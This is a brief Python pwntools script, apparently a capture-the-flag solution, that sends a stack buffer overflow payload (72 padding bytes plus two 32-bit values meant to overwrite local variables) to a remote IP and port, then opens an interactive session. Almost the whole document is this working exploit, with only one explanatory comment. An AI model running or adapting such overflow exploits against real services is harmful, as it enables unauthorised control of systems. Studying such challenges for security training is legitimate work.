#first check for offset of the input string and then accordingly modify the values stored by registers [local_4h] by 0xdeadbeef [local_8h]. 

from pwn import *

p=remote('139.59.30.165',8800)
payload=""
payload+="A"*72
payload+=p32(0xcafebabe)
payload+=p32(0xdeadbeef)
p.sendline(payload)
p.interactive()	